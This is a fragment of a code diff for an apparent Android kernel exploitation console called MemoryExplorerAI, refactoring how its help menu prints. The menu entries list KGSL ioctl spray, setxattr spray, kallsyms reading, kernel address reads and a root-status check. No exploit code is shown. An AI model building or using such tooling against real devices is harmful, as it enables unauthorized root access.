+                    ("tstack",            "Same as pidmap (alias)"),
+                    ("syms / allsyms",    "Deep-read /proc/kallsyms"),
+                    ("ksd / kdump",       "Dump kallsyms cache (loaded)"),
+                    ("ks",                "Reload kallsyms from /proc"),
+                    ("englog / elog",     "Show last 40 engine stderr lines"),
+                    ("vcomm",             "Verify spray procs comm"),
+                    ("rva <hex>",         "Read kernel VA via engine"),
+                    ("id / uid",          "Quick id equivalent (uid/gid/euid/egid)"),
+                    ("root",              "Check root status (same as R)"),
+                    ("kgsl",              "Test KGSL ioctl spray"),
+                    ("health / diag",     "Full health check"),
+                    ("xt",                "Toggle setxattr spray (on/off)"),
+                    ("w3",                "Toggle W3 deep-scan worker"),
+                    ("clear_kb",          "Reset knowledge base"),
                     ("help / ? / h",      "Show this help"),
                 ]
                 for k, v in lines:
-                    sys.stdout.write(f"  {C.GRN}{k:<18}{C.RST} {C.WHT}{v}{C.RST}\n")
-                sys.stdout.write(f"\n{C.MAG}── KEYBOARD SHORTCUTS ──{C.RST}\n")
+                    out_lines.append(
+                        f"  {C.GRN}{k:<18}{C.RST} "
+                        f"{C.WHT}{v}{C.RST}")
+                out_lines.append(
+                    f"\n{C.MAG}── KEYBOARD SHORTCUTS ──{C.RST}")
                 kbd = [
-                    ("Enter",       "Submit command / go back from detail view"),
+                    ("Enter",       "Submit command / go back"),
                     ("Backspace",   "Erase one char in command line"),
                     ("Up / Down",   "Browse command history"),
                     ("Ctrl+C",      "Quit explorer"),
@@ -8451,14 +8512,11 @@ class MemoryExplorerAI:
                     ("Ctrl+E",      "Rewind to last submitted command"),
                 ]
                 for k, v in kbd:
-                    sys.stdout.write(f"  {C.YEL}{k:<14}{C.RST} {C.WHT}{v}{C.RST}\n")
-                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
-                sys.stdout.write("Press Enter to return...")
-                sys.stdout.flush()
-                try:
-                    self.input_cmd()
-                except Exception:
-                    pass
+                    out_lines.append(
+                        f"  {C.YEL}{k:<14}{C.RST} "
+                        f"{C.WHT}{v}{C.RST}")
+                out_lines.append(f"{C.GRY}{'─'*75}{C.RST}")
+                self._terminal_print("\n".join(out_lines))
             elif cmd.startswith("v") and cmd[1:].isdigit():
                 # Re-verify a found item by re-reading its VA
                 idx = int(cmd[1:])
